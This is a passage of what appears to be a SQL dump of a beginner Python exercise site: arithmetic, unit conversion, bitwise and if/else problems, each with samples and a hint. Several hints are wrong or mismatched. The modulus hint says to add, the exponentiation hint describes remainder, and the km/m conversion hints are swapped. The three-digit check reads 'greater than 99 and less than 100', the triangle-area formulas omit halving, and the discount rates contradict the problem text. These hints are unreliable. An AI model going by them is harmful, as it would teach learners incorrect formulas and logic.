style=\"line-height: 1;\">Python program to get two integer numbers, multiply both the integers and display the product.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n6</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">30 </p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">65 \r\n10 </p><p style=\"line-height: 1;\">Sample Output 2 :</p><p style=\"line-height: 1;\">\r\n650\r\n</p>','B','','prog/python/multiplication.py','<p style=\"line-height: 1;\">Read two inputs using input() method.\r\n</p><p style=\"line-height: 1;\">Convert it into integer by int() method.\r\n</p><p style=\"line-height: 1;\">Multiply it using * operator</p>',15,NULL,NULL,NULL),(886,'Python Division','Python-Division','<p style=\"line-height: 1;\">Python program to get two integer numbers, divide both the integers and display the quotient.</p><p style=\"line-height: 1;\">\r\nSample Input 1:</p><p style=\"line-height: 1;\">\r\n10\r\n3\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">3.3333 </p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n29\r\n2 </p><p style=\"line-height: 1;\">Sample Output 2 :</p><p style=\"line-height: 1;\">\r\n14.5\r\n</p>','B','','prog/python/division.py','<p style=\"line-height: 1;\">Read two inputs using input() method.</p><p style=\"line-height: 1;\">\r\nConvert it into integer by int() method.</p><p style=\"line-height: 1;\">\r\nDivide it using / operator.</p><p style=\"line-height: 1;\"> It gives quotient of division operation.</p>',15,'','raptor/divide_two_numbers_Y6bdKql.PNG',''),(887,'Python Integer Division','Python-Integer-Division','<p style=\"line-height: 1;\">Python program to get two integer numbers, divide both the integers and display the Integer quotient.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">10\r\n3\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">3 </p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n29\r\n2 </p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">14\r\n</p>','B','','prog/python/idivision.py','<p style=\"line-height: 1;\">Read two inputs using input() method.\r\n</p><p style=\"line-height: 1;\">Convert it into integer by int() method.\r\n</p><p style=\"line-height: 1;\">Divide using // operator, which gives integer quotient.\r\n</p>',15,'','raptor/divide_two_numbers_JqmkJlu.PNG',''),(888,'Python Modulus','Python-Modulus','<p style=\"line-height: 1;\">Python program to get two integer numbers, divide both the integers and display the remainder.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n6\r\n5 </p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n1</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">28\r\n4</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">&nbsp;0</p>','B','','prog/python/modulus.py','<p style=\"line-height: 1;\">Read two inputs using input() method.</p><p style=\"line-height: 1;\">\r\nConvert it into integer by int() method.\r\n</p><p style=\"line-height: 1;\">Add it using + operator.</p>',15,NULL,NULL,NULL),(889,'Python Exponentiation','Python-Exponentiation','<p style=\"line-height: 1;\">Python program to calculate Power of a Number\r\n</p><p style=\"line-height: 1;\">Sample Input 1: </p><p style=\"line-height: 1;\">2\r\n3\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">8</p>','B','','prog/python/exponentiation.py','<p style=\"line-height: 1;\">Read two inputs using input() method.\r\n</p><p style=\"line-height: 1;\">Convert it into integer by int() method.\r\n</p><p style=\"line-height: 1;\">% operator gives remainder.</p>',15,'','raptor/exponentiation.PNG',''),(890,'Kilometer to Meter in Python','Kilometer-to-Meter-in-Python','<p style=\"line-height: 1;\">Python program to get Kilometer km from user and find meter m\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n56\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">56000\r\n\r\n</p>','B','','prog/python/kmtom.py','get kilometer using input() method\r\ndivide it by 1000 (1kilometer = 1000 meters)',15,'','raptor/kilometer_to_meter_NB9ZJLz.PNG',''),(891,'Meters to Kilo Meters in Python','Meters-to-Kilo-Meters-in-Python','<p style=\"line-height: 1;\">Python program to get meter m from user and find kilometer km</p><p style=\"line-height: 1;\">\r\nSample Input 1:\r\n</p><p style=\"line-height: 1;\">56000\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">56\r\n\r\n</p>','B','','prog/python/mtokm.py','get meter using input() method\r\nmultiply it by 1000 (1kilometer = 1000 meters)',15,NULL,NULL,NULL),(892,'Area of Square in Python','Area-of-Square-in-Python','<p style=\"line-height: 1;\">Python program to get side of square and find area of square\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n4</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">16\r\n\r\n</p>','B','','prog/python/square.py','get a side value of a square using input() method\r\ncalculate area = side * side',15,NULL,NULL,NULL),(893,'Area of Rectangle in Python','Area-of-Rectangle-in-Python','<p style=\"line-height: 1;\">Python program to getlength and breadth of rectangle and find area of rectangle</p><p style=\"line-height: 1;\">\r\nSample Input 1:\r\n</p><p style=\"line-height: 1;\">4\r\n5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">20\r\n\r\n</p>','B','','prog/python/rectangle.py','get length and breadth of a rectangle using input() method\r\ncalculate area = length * breadth',15,NULL,NULL,NULL),(894,'Area of Right angled triangle in Python','Area-of-Right-angled-triangle-in-Python','<p style=\"line-height: 1;\">Python program to get length and width of right angled trianlgle and find area of right angled triangle</p><p style=\"line-height: 1;\">\r\nSample Input 1:</p><p style=\"line-height: 1;\">\r\n4\r\n5</p><p style=\"line-height: 1;\">\r\nSample Output 1:</p><p style=\"line-height: 1;\">\r\n10\r\n\r\n</p>','B','','prog/python/rtriangle.py','get length and width of a right-angled triangle using input() method\r\ncalculate area = length * width',15,'','raptor/area_of_right_angle_triangle_bXro6By.PNG',''),(895,'Area of triangle in Python','Area-of-triangle-in-Python','<p style=\"line-height: 1;\">Python program to get base width and height of triangle and find area of triangle\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4\r\n5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">10\r\n</p>','B','','prog/python/triangle.py','get height and base of a triangle using input() method\r\ncalculate area = height * base',15,'','raptor/area_of_triangle_nuvQ7ei.PNG',''),(896,'Area of Circle in Python','Area-of-Circle-in-Python','<p style=\"line-height: 1;\">Python program to get radius of circle and find area of circle.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">50.24\r\n</p>','B','','prog/python/circle.py','get th radius of a circle using input() method\r\ncalculate area = pi * r * r',15,'','raptor/Area_of_circle.PNG',''),(897,'Circumference of Circle in Python','Circumference-of-Circle-in-Python','<p style=\"line-height: 1;\">Python program to get radius of circle and find circumference of circle.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n25.12\r\n\r\n</p>','B','','prog/python/ccircle.py','get the radius of a circle using input() method\r\ncalculate area = 2 * pi * r',15,'','raptor/Circumference.PNG',''),(898,'Calculate Salary of Employee in Python','Calculate-Salary-of-Employee-in-Python','<p style=\"line-height: 1;\">Python program to get employee wages and number of days worked from user and find Basic Pay, DA, HRA, PF and Net Pay.\r\n</p><p style=\"line-height: 1;\">(Note HRA, DA and PF are 10%,5%and 12% of basicpay respectively.)\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">300\r\n30\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nBasic Pay:3000\r\nDA: 150\r\nHRA:300\r\nPF:360\r\nNet Pay: 3090\r\n</p>','B','','prog/python/salary.py','<p style=\"line-height: 1;\">get wages and number of days present of an employee using input() method.\r\n</p><p style=\"line-height: 1;\">calculate basic pay, DA, HRA , PF  Net Pay using formula</p>',15,'','raptor/employee_salary_WBLnXJv.PNG',''),(899,'Kilobytes to bytes in Python','Kilobytes-to-bytes-in-Python','<p style=\"line-height: 1;\">Python program to get kilobytes kb from user and find bytes b\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n2</p><p style=\"line-height: 1;\">\r\nSample Output 1:</p><p style=\"line-height: 1;\">\r\n2048</p><p style=\"line-height: 1;\"> Sample Input 2:</p><p style=\"line-height: 1;\">\r\n1</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n1024\r\n</p>','B','','prog/python/kbtob.py','<p style=\"line-height: 1;\">get kilobytes using input() method.</p><p style=\"line-height: 1;\">\r\nCalculate byte = kilobytes * 1024 (1 kilo byte = 1024 bytes)</p>',15,'','raptor/kilo_bytes_to_bytes.PNG',''),(900,'Bytes to kilobytes in Python','Bytes-to-kilobytes-in-Python','<p style=\"line-height: 1;\">Python program to get bytes b from user and  find kilobytes kb</p><p style=\"line-height: 1;\">\r\nSample Input 1:\r\n</p><p style=\"line-height: 1;\">2048</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">2</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n1024</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n1</p>','B','','prog/python/btokb.py','<p style=\"line-height: 1;\">get bytes using input() method.</p><p style=\"line-height: 1;\">\r\nCalculate kilobyte = byte/1024  (1 kilo byte = 1024 bytes)</p>',15,NULL,NULL,NULL),(901,'Simple interest in Python','Simple-interest-in-Python','<p style=\"line-height: 1;\">\r\nPython program to get Principle amount, number of months, rate of interest from user and calculate </p><p style=\"line-height: 1;\">simple interest.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5000\r\n12\r\n1.0\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n600.00</p>','B','','prog/python/simple_interest.py','<p style=\"line-height: 1;\">Get principal p, number of months n and rate of intereset r as inputs.</p><p style=\"line-height: 1;\">(using input() statement)\r\n\r\ncalculate Simple Intereset SI by formula SI= p*n*r/100\r\n\r\nprint Simple Interest SI using print() method.</p>',15,NULL,NULL,NULL),(902,'Fahrenheit to Celsius in Python','Fahrenheit-to-Celsius-in-Python','<p style=\"line-height: 1;\">Python program to get Fahrenheit F from user and find celsius C\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n92.2\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">33.44\r\n</p>','B','','prog/python/ftoc.py','Get Fahrenheit f as input (using input() method)\r\n\r\nCalculate Celsius c using Formula c=(f-32)*0.5556\r\n\r\nprint Celcius c (using print() method).',15,NULL,NULL,NULL),(903,'Celsius to Fahrenheit in Python','Celsius-to-Fahrenheit-in-Python','<p style=\"line-height: 1;\">Python program to get Celsius C from user and find Fahrenheit F\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n33.44</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">92.20</p>','B','','prog/python/ctof.py','Get celsius c as input (using input() method)\r\n\r\nCalculate Fahrenheit f using Formula f=1.8*c+32\r\n\r\nprint Fahrenheit f (using print() method).',15,NULL,NULL,NULL),(904,'Swap two numbers in Python','Swap-two-numbers-in-Python','<p style=\"line-height: 1;\">Python program to get two integers a and b from user and swap the values\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">6\r\n5</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">5 6\r\n</p>','B','','prog/python/swap.py','<p style=\"line-height: 1;\">Get a and b using input() method\r\n\r\nswap the values using tuple assignment feature in python.\r\n</p><p style=\"line-height: 1;\">\r\nPrint a and b using print() method</p>',15,NULL,NULL,NULL),(905,'Last Digit of integer in Python','Last-Digit-of-integer-in-Python','<p style=\"line-height: 1;\">Python program to get an number  n from user  and display the last digit of n\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n623</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">3</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">280</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">0\r\n</p>','B','','prog/python/last_digit.py','<p style=\"line-height: 1;\">Get a number num (using input() method)\r\n\r\nSeprate the last digit of number num by \"digit = num%10\".</p><p style=\"line-height: 1;\"> (% by 10 always gives last digit of a number)\r\n\r\nprint the digit (using print() method)</p>',15,NULL,NULL,NULL),(906,'Set a bit in Python | Reset a bit in Python','Set-a-bit-in-Python-Reset-a-bit-in-Python','<p style=\"line-height: 1;\">Python program to get a number n and bit b, n is a number and b denotes any bit postion of n. set b postion of n as 1 if it is 0, reset b postion of n as 0 if it is 1.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n4\r\n1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">5\r\nNote:\r\n4-&gt;0000 0100\r\nAfter seting 1st Pos: 0000 0101\r\n</p><p style=\"line-height: 1;\">So output is 5.</p>','B','','prog/python/setbit.py','Get a number num and bit as input  (using input() method)\r\n\r\nleft shift 1 by bit times (n=1<<bit)\r\n\r\nXOR n with num, num = num ^ n (it makes bit position as 0 if its is 1, else 1 if it is 0)\r\n\r\nprint the digit (using print() method)',15,NULL,NULL,NULL),(907,'Python Xor','Python-Xor','<p style=\"line-height: 1;\">Python program to Illustrate xor operator (A xor A ==&gt; 0)</p><p style=\"line-height: 1;\">\r\nSample Input 1:</p><p style=\"line-height: 1;\">\r\n6\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n0\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">28\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n0\r\n</p>','B','','prog/python/xor_init.py','XOR any value with the same produces zero.',15,NULL,NULL,NULL),(908,'Python Left shift Operator','Python-Left-shift-Operator','<p style=\"line-height: 1;\">Python program to get number n and m, left shit the bits of n for m times:\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n4 1</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">8</p>','B','','prog/python/leftshift.py','left shift is equal to multiply a number with 2, left shift by n is equal to multiply with pow(2,n)',15,NULL,NULL,NULL),(909,'Python Right Shift Operator','Python-Right-Shift-Operator','<p style=\"line-height: 1;\">Python program to get number n and m, right shit the bits of n for m times:\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">2</p>','B','','prog/python/rightshift.py','right shift is equal to divide a number by 2,  right shift by n is equal to divide by pow(2,n)',15,NULL,NULL,NULL),(910,'Python Bitwise AND','Python-Bitwise-AND','<p style=\"line-height: 1;\">Python Program to illustrate bitwise ANDoperator\r\n</p><p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">1 \r\n4\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">\r\n0\r\n</p>','B','','prog/python/b_and.py','1 & 1 = 1\r\n0 & anything = 0',15,NULL,NULL,NULL),(911,'Python Bitwise OR','Python-Bitwise-OR','<p style=\"line-height: 1;\">Python Program to illustrate bitwise OR operator\r\n</p><p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">1 \r\n4\r\n</p><p style=\"line-height: 1;\">Sample Output 2 :</p><p style=\"line-height: 1;\">\r\n5</p>','B','','prog/python/b_or.py','1 | anything = 1\r\n0 | 0 = 0',15,NULL,NULL,NULL),(912,'Python Complement Operator','Python-Complement-Operator','Python Program to illustrate complement operator','B','','prog/python/complement.py','1 complement = 0\r\n0 complement = 1',15,NULL,NULL,NULL),(913,'Python if example','Python-if-example','<p style=\"line-height: 1;\">Python Program to get price and quantity of a product, calculate bill amount and calculate 10% discount \r\nfor the bill amount 5000 and above.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">10\r\n400\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">4000\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">10 500\r\n</p><p style=\"line-height: 1;\">Sample Output:\r\n</p><p style=\"line-height: 1;\">4500</p>','B','','prog/python/discount.py','<p style=\"line-height: 1;\">Get two inputs quantity and price from user using <b>input()</b> method\r\n</p><p style=\"line-height: 1;\">\r\nCalculate amount by using the expression <b>amount = quantity * price</b>\r\n\r\nCheck whether amount is greater than 5000 using <b>if</b> statement.</p><p style=\"line-height: 1;\">\r\n\r\nif amount is greater than 5000 then calculate discount and amount using the expressions <b>discount = amount * 0.05</b> and <b>amount = amount - discount</b>.\r\n</p><p style=\"line-height: 1;\">\r\nprint amount using <b>print()</b> method.</p>',16,NULL,NULL,NULL),(914,'Greatest of two numbers in Python','Greatest-of-two-numbers-in-Python','<p style=\"line-height: 1;\">Python Program to get two numbers num1 and num2 and find the greatest one among num1 \r\nand num2.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n6</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">6</p>','B','','prog/python/greatest.py','<p style=\"line-height: 1;\">Get two inputs num1 and num2 from user using <b>input()</b> method\r\n\r\ncheck whether num1 is greater than num2 using <b>if </b>statement.</p><p style=\"line-height: 1;\">\r\n\r\nif num1 is greater print num1 using <b>print()</b> method, else check whether num2 is greater than num1 using <b>elseif</b> statement.\r\n</p><p style=\"line-height: 1;\">\r\nIf num2 is greater print num2 using print() method, else print num1 and num2 are equal using <b>print() </b>method.</p>',16,'','raptor/greatest_of_two_numbers_Ik2nQbD.PNG',''),(915,'Smallest of two numbers in python','Smallest-of-two-numbers-in-python','<p style=\"line-height: 1;\">Python Program to get two numbers num1 and num2 and find the smallest one among num1 \r\nand num2.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n6\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">5\r\n</p>','B','','prog/python/smallest.py','<p style=\"line-height: 1;\">Get two inputs num1 and num2 from user using <b>input()</b> statement\r\n\r\ncheck whether num1 is smaller than num2 using <b>if </b>statement.</p><p style=\"line-height: 1;\">\r\n\r\nif num1 is smaller print num1 using <b>print()</b> method, else check whether num2 is smaller than num1 using <b>elseif</b> statement.</p><p style=\"line-height: 1;\">\r\n\r\nIf num2 is smaller print num2 using print()  method, else print num1 and num2 are equal using <b>print() </b>statment.</p>',16,NULL,NULL,NULL),(916,'ODD or Even in Python','ODD-or-Even-in-Python','<p style=\"line-height: 1;\">Python Program to get a number num and check whether num is odd or even?\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\"> 45</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">ODD\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">56\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\nEVEN</p>','B','','prog/python/odd_even.py','<p style=\"line-height: 1;\">Get input num from user using input() method\r\n\r\ncheck whether the remainder of num divided by 2 is equal to 0 using if statement.\r\n</p><p style=\"line-height: 1;\">\r\nif it is 0, then print num is even using print()  method. </p><p style=\"line-height: 1;\">Else print num is odd using print()  method.\r\n</p>',16,'','raptor/odd_or_even_g94a0iT.PNG',''),(917,'3 digit number or not in python','3-digit-number-or-not-in-python','<p style=\"line-height: 1;\">Python Program to get a number num and check whether num is three digit number or not?.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">1000\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">Not a three digit number\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">987\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">Three digit number</p>','B','','prog/python/3digit.py','<p style=\"line-height: 1;\">Get input num from user using input()  method\r\n\r\ncheck whether the num is greater than 99 and less than 100 using if statement.</p><p style=\"line-height: 1;\">\r\n\r\nif it is true, then print num is three digit number using print()  method.</p><p style=\"line-height: 1;\"> Else print num is not three digit number using print()  method.\r\n</p>',16,'','raptor/3_digit_number_or_not_PmO2gGJ.PNG',''),(918,'Greatest of three numbers in Python','Greatest-of-three-numbers-in-Python','<p style=\"line-height: 1;\">Python Program to get three numbers num1, num2 and num3 and find the greatest one among num1,num2 and num3.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n6\r\n2\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n6</p>','B','','prog/python/greatestt.py','<p style=\"line-height: 1;\">Get three inputs num1, num2 and num3 from user using input()  methods.\r\n</p><p style=\"line-height: 1;\">\r\nCheck whether num1 is greater than num2 and num3 using if statement, if it is true print num1 is greatest using print()  method.\r\n</p><p style=\"line-height: 1;\">\r\nElse, num2 or num3 is greatest. </p><p style=\"line-height: 1;\">So check whether num2 is greater than num3 using elseif statement.</p><p style=\"line-height: 1;\"> \r\n\r\nif num2 is greater, then print num2 is greater using print()  method.</p><p style=\"line-height: 1;\"> Else, print num3 is greater using print()  method.\r\n</p>',16,NULL,NULL,NULL),(919,'Smallest of three numbers in Python','Smallest-of-three-numbers-in-Python','<p style=\"line-height: 1;\">Python Program to get three numbers num1, num2 and num3 and find the smallest one among num1,num2 and num3.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">1\r\n6\r\n2</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1</p>','B','','prog/python/smallestt.py','<p style=\"line-height: 1;\">Get three inputs num1, num2 and num3 from user using input()  methods.\r\n</p><p style=\"line-height: 1;\">\r\nCheck whether num1 is smaller than num2 and num3 using if statement, if it is true print num1 is smallest using print()  method.\r\n</p><p style=\"line-height: 1;\">\r\nElse, num2 or num3 is smallest. </p><p style=\"line-height: 1;\">So check whether num2 is smaller than num3 using elseif statement.</p><p style=\"line-height: 1;\"> \r\n\r\nif num2 is greater, then print num2 is smallest using print()  method. </p><p style=\"line-height: 1;\">Else, print num3 is smallest using print()  method.\r\n</p>',16,NULL,NULL,NULL),(920,'Divisible by 3 or not in python','Divisible-by-3-or-not-in-python','<p style=\"line-height: 1;\">Python Program to get a number num and check whether num is divisible by 3.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">27\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nDivisible by 3\r\n</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n43\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">Not divisible by 3</p>','B','','prog/python/divisibleby3.py','<p style=\"line-height: 1;\">Get input num from user using input()  method\r\n\r\ncheck whether the remainder of num divided by 3 is equal to 0 using if statement.\r\n</p><p style=\"line-height: 1;\">\r\nif it is 0, then print num is divisible by 3 using print()  method.</p><p style=\"line-height: 1;\"> Else print num is not divisible by 3 using print()  method.\r\n</p>',16,NULL,NULL,NULL),(921,'Leap year in python','Leap-year-in-python','<p style=\"line-height: 1;\">Python Program to get a year and check whether year is leap year or not.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">2016\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">Leap year\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">2017\r\n</p><p style=\"line-height: 1;\">Sample Output&nbsp; 2:</p><p style=\"line-height: 1;\">Not Leap Year</p>','B','<p>year = int(input(\"Enter a year: \"))<br></p><p>if (year % 4) == 0:<br></p><p>&nbsp; &nbsp;if (year % 100) == 0:</p><p>&nbsp; &nbsp; &nbsp; &nbsp;if (year % 400) == 0:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;print(\"{0} is a leap year\".format(year))</p><p>&nbsp; &nbsp; &nbsp; &nbsp;else:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;print(\"{0} is not a leap year\".format(year))</p><p>&nbsp; &nbsp;else:</p><p>&nbsp; &nbsp; &nbsp; &nbsp;print(\"{0} is a leap year\".format(year))</p><p>else:</p><p>&nbsp; &nbsp;print(\"{0} is not a leap year\".format(year))</p>',NULL,'<p style=\"line-height: 1;\">Get input year from user using input()  method, </p><p style=\"line-height: 1;\">All the years divisible by 4 are leap year except century years. Century years are leap year if it is divisible by 400.&nbsp;&nbsp;</p>',16,'','',NULL),(922,'Last digit divisible by 3 or not in python','Last-digit-divisible-by-3-or-not-in-python','<p style=\"line-height: 1;\">Python Program to get a number num and check whether last digit of num is divisible by three.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">27\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">last digit not Divisible by 3\r\n</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n43\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\nlast digit divisible by 3</p>','B','','prog/python/lastdigit_div.py','<p style=\"line-height: 1;\">Get input num from user using input()  method\r\n\r\nextract last digit from num using the expression digit=num%10.\r\n\r\ncheck whether the remainder of digit divided by 3 is equal to 0 using if statement.</p><p style=\"line-height: 1;\">\r\n\r\nif it is 0, then print tdig is divisible by 3 using print()  method. </p><p style=\"line-height: 1;\">Else print digit is not divisible by 3 using print()  method.\r\n</p><p style=\"line-height: 1;\">\r\n\r\n\r\nNote: any number modulus of 10 gives last digit of number.</p>',16,NULL,NULL,NULL),(923,'Calculator in python','Calculator-in-python','<p style=\"line-height: 1;\">Python Program to get a binary arithmetic expression and solve the expression.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">12\r\n+\r\n9</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">21\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">4\r\n*\r\n5\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">20\r\n</p>','B','','prog/python/calculator.py','Based on the second input (operator) any one arthmetic operation in chained if will be done',16,NULL,NULL,NULL),(924,'grade calculation in python','grade-calculation-in-python','<p style=\"line-height: 1;\">Python Program to get a mark of a student and find its grade.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n75\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nC\r\n</p>','B','','prog/python/grade.py','<p style=\"line-height: 1;\">chained conditional check is used here to check the mark range. </p><p style=\"line-height: 1;\">any one of the grade will be displayed.</p>',16,'','raptor/grade_inc_A6HpYZY.png',''),(925,'else if in python','else-if-in-python','<p style=\"line-height: 1;\">Python Program to get price and quantity of a product, calculate bill amount, calculate 10% discount for the bill amount 5000 and above, 5% discount for the bill amount 1000 and above.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">10\r\n400\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">3800</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">10 500\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">4500\r\n</p>','B','','prog/python/discountt.py','chained conditional check is used here to check whether amount is greater than 5000 or greater than 10000. any one of the expression to calculate discount will be executed.',16,'','',NULL),(926,'check whether bit is set in python','check-whether-bit-is-set-in-python','<p style=\"line-height: 1;\">Python Program to get a number n and bit I, check whether ith bit in num is set or not.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n8\r\n3\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nNot Set\r\n</p><p style=\"line-height: 1;\">Sample Input 